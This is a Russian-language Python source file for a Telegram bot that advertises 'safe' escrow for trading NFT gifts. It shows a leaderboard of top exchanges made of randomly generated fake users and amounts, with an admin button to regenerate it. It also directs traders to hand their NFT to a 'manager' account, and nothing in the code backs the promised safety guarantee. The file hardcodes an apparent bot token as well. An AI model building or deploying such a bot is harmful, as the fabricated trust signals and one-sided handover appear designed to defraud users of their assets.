# NFT Exchange Bot для iPhone
# ФИНАЛЬНАЯ ВЕРСИЯ - маленькие кнопки, исправленные тексты

import requests
import time
import uuid
import random
from datetime import datetime

# ===== НАСТРОЙКИ =====
TOKEN = "8487741416:AAHlISX26SKheAnTQJCv1rPHY-X0f3fWdI0"
ADMIN_ID = 174415647
SUPPORT = "GiftExchangersSupport"
MANAGER = "GiftExchangersManager"
BOT_USERNAME = "GiftExchangersBot"

# ===== ХРАНИЛИЩЕ ДАННЫХ =====
deals = {}
top_deals = []
users = {}
banned_users = set()
settings = {
    "min_amount": 100,
    "max_amount": 300
}

# ===== КЛАВИАТУРЫ (МАЛЕНЬКИЕ КНОПКИ) =====
def main_keyboard():
    return {
        "keyboard": [
            [{"text": "📝 Создать сделку"}],
            [{"text": "❓ Как происходит сделка"}, {"text": "ℹ️ Информация"}],
            [{"text": "📞 Техподдержка"}, {"text": "🏆 Топ-15 обменов"}]
        ],
        "resize_keyboard": True
    }

def admin_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📊 Статистика", "callback_data": "admin_stats"}],
            [{"text": "📢 Рассылка", "callback_data": "admin_broadcast"}],
            [{"text": "📋 Все сделки", "callback_data": "admin_deals"}],
            [{"text": "🎲 Топ-15 (рандом)", "callback_data": "admin_random_top"}],
            [{"text": "❌ Закрыть", "callback_data": "admin_close"}]
        ]
    }

# ===== ОТПРАВКА СООБЩЕНИЙ =====
def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        data["reply_markup"] = keyboard
    try:
        requests.post(url, json=data)
    except:
        pass

def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    keyboard = {"inline_keyboard": buttons}
    data = {
        "chat_id": chat_id,
        "text": text,
        "reply_markup": keyboard,
        "parse_mode": parse_mode
    }
    try:
        requests.post(url, json=data)
    except:
        pass

def edit_message(chat_id, message_id, text, keyboard=None, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    data = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        data["reply_markup"] = keyboard
    try:
        requests.post(url, json=data)
    except:
        pass

# ===== ГЕНЕРАЦИЯ ТОП-15 С РАНДОМНЫМИ ЮЗЕРАМИ =====
def generate_random_top():
    global top_deals
    random_top = []
    first_names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack", 
                   "Kevin", "Laura", "Mike", "Nancy", "Oliver", "Paul", "Quinn", "Rose", "Sam", "Tina"]
    
    for i in range(15):
        amount = random.randint(100, 400)
        user1 = f"user{random.randint(1000, 9999)}"
        user2 = f"user{random.randint(1000, 9999)}"
        random_top.append({
            'user1': f"@{user1}",
            'user2': f"@{user2}",
            'amount': amount,
            'date': datetime.now().strftime("%Y-%m-%d")
        })
    
    # Сортируем по убыванию
    random_top.sort(key=lambda x: x['amount'], reverse=True)
    top_deals = random_top
    return random_top

# ===== ОБРАБОТКА СООБЩЕНИЙ =====
def handle_message(message):
    chat_id = message['chat']['id']
    text = message.get('text', '')
    user_id = message['from']['id']
    username = message['from'].get('username', 'NoUsername')
    first_name = message['from'].get('first_name', 'Пользователь')
    
    if user_id in banned_users:
        send_message(chat_id, "🚫 Вы забанены в боте!")
        return
    
    if user_id not in users:
        users[user_id] = {
            'username': username,
            'first_name': first_name,
            'chat_id': chat_id,
            'state': None,
            'temp_data': {}
        }
    
    if text == '/start':
        welcome_text = """
<b>👋 Приветствуем в проекте «Gift Exchange».</b>

<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>

👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
        """
        send_message(chat_id, welcome_text, main_keyboard())
    
    elif text == "ℹ️ Информация":
        info_text = """
<b>📤 Наш проект создан для безопасного обмена NFT подарками среди пользователей Telegram'a.</b>

<b>➕ В чем плюсы нашего проекта?</b>
• <b>Быстрые, качественные и безопасные обмены!</b>
• <b>Техническая поддержка 24/7</b>
• <b>Гарантия безопасности каждой сделки</b>
• <b>Конфиденциальность данных</b>
• <b>Интуитивно понятный интерфейс</b>

<b>📞 Техническая поддержка:</b> @GiftExchangersManager

<b>🤝 Желаем отличных обменов!</b>
        """
        buttons = [[
            {"text": "❓ Как происходит сделка", "callback_data": "how_deal"},
            {"text": "🏠 Главное меню", "callback_data": "main_menu"}
        ]]
        send_inline_keyboard(chat_id, info_text, buttons)
    
    elif text == "❓ Как происходит сделка":
        deal_text = """
<b>❓ Как происходит сделка в Gift Exchange?</b>

• <b>Продавец и покупатель обговаривают условия сделки 🤝</b>

• <b>Один участник сделки создаёт сделку через меню бота - @GiftExchangersBot 🎁</b>

• <b>Второй участник сделки принимает сделку 📤</b>

• <b>После того как 2 человека присоединились к сделке, первый участник передаёт NFT менеджеру - @GiftExchangersManager 💰</b>

• <b>После передачи подарка, техподдержка моментально одобрит приход NFT</b>

• <b>Затем вторая сторона передаёт NFT</b>

• <b>Менеджер передаёт NFT первому участнику</b>

• <b>Сделка завершена успешно! ✅</b>
        """
        buttons = [[
            {"text": "🏠 Главное меню", "callback_data": "main_menu"}
        ]]
        send_inline_keyboard(chat_id, deal_text, buttons)
    
    elif text == "📞 Техподдержка":
        support_text = f"""
<b>📞 Техническая поддержка:</b>

<b>👤 Поддержка:</b> @{SUPPORT}
<b>👤 Менеджер:</b> @{MANAGER}

<b>Напишите им в личные сообщения для получения помощи!</b>
        """
        send_message(chat_id, support_text, main_keyboard())
    
    elif text == "🏆 Топ-15 обменов":
        if not top_deals:
            # Генерируем рандомный топ-15 при первом запросе
            top_deals = generate_random_top()
        
        top_text = "<b>🏆 ТОП-15 ЛУЧШИХ ОБМЕНОВ (до $400)</b>\n\n"
        for i, deal in enumerate(top_deals[:15], 1):
            top_text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
        send_message(chat_id, top_text)
    
    elif text == "📝 Создать сделку":
        users[user_id]['state'] = 'waiting_username'
        users[user_id]['temp_data'] = {}
        send_message(chat_id, "<b>Введите @username второго участника сделки:</b>")
    
    elif user_id in users and users[user_id].get('state') == 'waiting_username':
        second_user = text.replace('@', '').strip()
        users[user_id]['temp_data']['second_user'] = second_user
        users[user_id]['state'] = 'waiting_my_nft'
        send_message(chat_id, "<b>Введите ссылку на ВАШУ NFT (которую отдаете):</b>")
    
    elif user_id in users and users[user_id].get('state') == 'waiting_my_nft':
        users[user_id]['temp_data']['my_nft'] = text
        users[user_id]['state'] = 'waiting_his_nft'
        send_message(chat_id, "<b>Введите ссылку на ЕГО NFT (которую получаете):</b>")
    
    elif user_id in users and users[user_id].get('state') == 'waiting_his_nft':
        users[user_id]['temp_data']['his_nft'] = text
        users[user_id]['state'] = 'waiting_amount'
        send_message(chat_id, f"<b>Введите сумму сделки в USD (от ${settings['min_amount']} до ${settings['max_amount']}):</b>")
    
    elif user_id in users and users[user_id].get('state') == 'waiting_amount':
        try:
            amount = float(text.replace('$', '').replace(',', '').strip())
            
            if amount < settings['min_amount']:
                send_message(chat_id, f"<b>❌ Минимальная сумма: ${settings['min_amount']}!</b>")
                return
            if amount > settings['max_amount']:
                send_message(chat_id, f"<b>❌ Максимальная сумма: ${settings['max_amount']}!</b>")
                return
            
            deal_id = str(uuid.uuid4())[:8]
            second_user = users[user_id]['temp_data']['second_user']
            my_nft = users[user_id]['temp_data']['my_nft']
            his_nft = users[user_id]['temp_data']['his_nft']
            
            deals[deal_id] = {
                'creator_id': user_id,
                'creator_name': username,
                'second_user': second_user,
                'my_nft': my_nft,
                'his_nft': his_nft,
                'amount': amount,
                'status': 'waiting',
                'created_at': datetime.now().strftime("%Y-%m-%d %H:%M"),
                'participant_id': None
            }
            
            deal_text = f"""
<b>✅ СДЕЛКА СОЗДАНА!</b>

<b>🆔 Номер:</b> <code>{deal_id}</code>
<b>👤 Создатель:</b> @{username}
<b>👤 Участник:</b> @{second_user}

<b>🎁 Ваша NFT:</b> {my_nft}
<b>🎁 Его NFT:</b> {his_nft}
<b>💰 Сумма:</b> ${amount}

<b>🔗 Ссылка на сделку:</b>
https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
            """
            
            buttons = [[
                {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"},
                {"text": "❌ Отменить", "callback_data": f"cancel_{deal_id}"}
            ]]
            
            send_inline_keyboard(chat_id, deal_text, buttons)
            
            for uid, user_data in users.items():
                if user_data.get('username') == second_user:
                    notify_text = f"""
<b>🔔 ВАС ПРИГЛАСИЛИ К ОБМЕНУ!</b>

<b>Пользователь @{username} создал сделку с вами!</b>

<b>🆔 Номер:</b> <code>{deal_id}</code>
<b>💰 Сумма:</b> ${amount}

<b>🔗 Ссылка:</b> https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                    """
                    
                    accept_buttons = [[
                        {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"}
                    ]]
                    
                    send_inline_keyboard(user_data['chat_id'], notify_text, accept_buttons)
                    break
            
            users[user_id]['state'] = None
            users[user_id]['temp_data'] = {}
            
        except ValueError:
            send_message(chat_id, "<b>❌ Введите число!</b>")
    
    elif text.startswith('/start deal_'):
        deal_id = text.replace('/start deal_', '')
        
        if deal_id in deals:
            deal = deals[deal_id]
            deal_info = f"""
<b>🔍 СДЕЛКА #{deal_id}</b>

<b>👤 Создатель:</b> @{deal['creator_name']}
<b>👤 Участник:</b> @{deal['second_user']}
<b>💰 Сумма:</b> ${deal['amount']}
<b>📊 Статус:</b> {deal['status']}

<b>🎁 NFT создателя:</b> {deal['my_nft']}
<b>🎁 NFT участника:</b> {deal['his_nft']}
            """
            
            if deal['status'] == 'waiting':
                buttons = [[
                    {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"}
                ]]
                send_inline_keyboard(chat_id, deal_info, buttons)
            else:
                send_message(chat_id, deal_info)
        else:
            send_message(chat_id, "<b>❌ Сделка не найдена!</b>", main_keyboard())
    
    elif text == '/admin' and user_id == ADMIN_ID:
        admin_text = f"""
<b>👨‍💼 ПАНЕЛЬ АДМИНИСТРАТОРА</b>

<b>📊 Сделок:</b> {len(deals)}
<b>👥 Пользователей:</b> {len(users)}
<b>💰 Лимиты:</b> ${settings['min_amount']}-${settings['max_amount']}
        """
        send_inline_keyboard(chat_id, admin_text, admin_keyboard()['inline_keyboard'])
    
    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_broadcast':
        users[user_id]['state'] = None
        sent = 0
        for uid, user_data in users.items():
            if uid != ADMIN_ID:
                try:
                    send_message(user_data['chat_id'], f"<b>📢 РАССЫЛКА:</b>\n\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
        send_message(chat_id, f"<b>✅ Отправлено: {sent}</b>")

# ===== ОБРАБОТКА КНОПОК =====
def handle_callback(callback):
    chat_id = callback['message']['chat']['id']
    message_id = callback['message']['message_id']
    data = callback['data']
    user_id = callback['from']['id']
    username = callback['from'].get('username', 'NoUsername')
    
    if data.startswith('accept_'):
        deal_id = data.replace('accept_', '')
        
        if deal_id not in deals:
            edit_message(chat_id, message_id, "<b>❌ Сделка не найдена!</b>")
            return
        
        deal = deals[deal_id]
        
        if deal['status'] != 'waiting':
            edit_message(chat_id, message_id, "<b>❌ Сделка уже недоступна!</b>")
            return
        
        if user_id == deal['creator_id']:
            edit_message(chat_id, message_id, "<b>❌ Нельзя принять свою сделку!</b>")
            return
        
        if username != deal['second_user'] and f"@{username}" != f"@{deal['second_user']}":
            edit_message(chat_id, message_id, "<b>❌ Эта сделка создана для другого пользователя!</b>")
            return
        
        deal['participant_id'] = user_id
        deal['participant_name'] = username
        deal['status'] = 'in_progress'
        
        # Добавляем в реальный топ только если сделка состоялась
        if settings['min_amount'] <= deal['amount'] <= settings['max_amount']:
            top_deals.append({
                'user1': f"@{deal['creator_name']}",
                'user2': f"@{username}",
                'amount': deal['amount'],
                'date': datetime.now().strftime("%Y-%m-%d")
            })
            # Сортируем и оставляем только 15
            sorted_top = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
            top_deals.clear()
            top_deals.extend(sorted_top)
        
        send_message(
            deal['creator_id'],
            f"<b>✅ @{username} ПРИНЯЛ СДЕЛКУ!</b>\n\n"
            f"<b>Передайте NFT менеджеру @{MANAGER}</b>"
        )
        
        edit_message(
            chat_id, 
            message_id, 
            f"<b>✅ ВЫ ПРИНЯЛИ СДЕЛКУ #{deal_id}</b>\n\n"
            f"<b>Ожидайте передачи NFT менеджеру.</b>"
        )
    
    elif data.startswith('cancel_'):
        deal_id = data.replace('cancel_', '')
        
        if deal_id in deals and deals[deal_id]['creator_id'] == user_id:
            deals[deal_id]['status'] = 'cancelled'
            edit_message(chat_id, message_id, f"<b>❌ СДЕЛКА #{deal_id} ОТМЕНЕНА</b>")
    
    elif data == "main_menu":
        welcome_text = """
<b>👋 Приветствуем в проекте «Gift Exchange».</b>

<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>

👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
        """
        send_message(chat_id, welcome_text, main_keyboard())
    
    elif data == "how_deal":
        deal_text = """
<b>❓ Как происходит сделка в Gift Exchange?</b>

• <b>Продавец и покупатель обговаривают условия сделки 🤝</b>

• <b>Один участник сделки создаёт сделку через меню бота - @GiftExchangersBot 🎁</b>

• <b>Второй участник сделки принимает сделку 📤</b>

• <b>После того как 2 человека присоединились к сделке, первый участник передаёт NFT менеджеру - @GiftExchangersManager 💰</b>

• <b>После передачи подарка, техподдержка моментально одобрит приход NFT</b>

• <b>Затем вторая сторона передаёт NFT</b>

• <b>Менеджер передаёт NFT первому участнику</b>

• <b>Сделка завершена успешно! ✅</b>
        """
        send_message(chat_id, deal_text)
    
    elif data == "admin_stats" and user_id == ADMIN_ID:
        stats_text = f"""
<b>📊 СТАТИСТИКА</b>

<b>📌 Всего сделок:</b> {len(deals)}
<b>👥 Пользователей:</b> {len(users)}
<b>🏆 В топ-15:</b> {len(top_deals)}
        """
        edit_message(chat_id, message_id, stats_text, admin_keyboard())
    
    elif data == "admin_broadcast" and user_id == ADMIN_ID:
        users[user_id]['state'] = 'admin_broadcast'
        edit_message(chat_id, message_id, "<b>📢 Введите текст рассылки:</b>")
    
    elif data == "admin_deals" and user_id == ADMIN_ID:
        if not deals:
            edit_message(chat_id, message_id, "<b>📭 Нет сделок</b>", admin_keyboard())
            return
        
        deals_text = "<b>📋 СДЕЛКИ:</b>\n\n"
        for deal_id, deal in list(deals.items())[:10]:
            status_emoji = "⏳" if deal['status'] == 'waiting' else "🔄" if deal['status'] == 'in_progress' else "✅"
            deals_text += f"{status_emoji} <b>{deal_id}</b>: @{deal['creator_name']} ↔ @{deal['second_user']} (${deal['amount']})\n"
        
        edit_message(chat_id, message_id, deals_text, admin_keyboard())
    
    elif data == "admin_random_top" and user_id == ADMIN_ID:
        random_top = generate_random_top()
        top_text = "<b>🎲 СГЕНЕРИРОВАН ТОП-15 (РАНДОМ):</b>\n\n"
        for i, deal in enumerate(random_top[:15], 1):
            top_text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
        edit_message(chat_id, message_id, top_text, admin_keyboard())
    
    elif data == "admin_close" and user_id == ADMIN_ID:
        welcome_text = """
<b>👋 Приветствуем в проекте «Gift Exchange».</b>

<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>

👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
        """
        send_message(chat_id, welcome_text, main_keyboard())

# ===== ЗАПУСК =====
def main():
    print("🚀 NFT Exchange Bot запущен!")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"👑 Админ ID: {ADMIN_ID}")
    
    # Генерируем рандомный топ-15 при старте
    generate_random_top()
    print(f"🏆 Сгенерирован топ-15 с {len(top_deals)} записями")
    
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            response = requests.get(url, params={
                "offset": offset,
                "timeout": 30
            })
            
            if response.status_code == 200:
                data = response.json()
                if data['ok']:
                    for update in data['result']:
                        offset = update['update_id'] + 1
                        
                        if 'message' in update:
                            handle_message(update['message'])
                        elif 'callback_query' in update:
                            handle_callback(update['callback_query'])
            
            time.sleep(0.5)
            
        except KeyboardInterrupt:
            print("\n❌ Бот остановлен")
            break
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
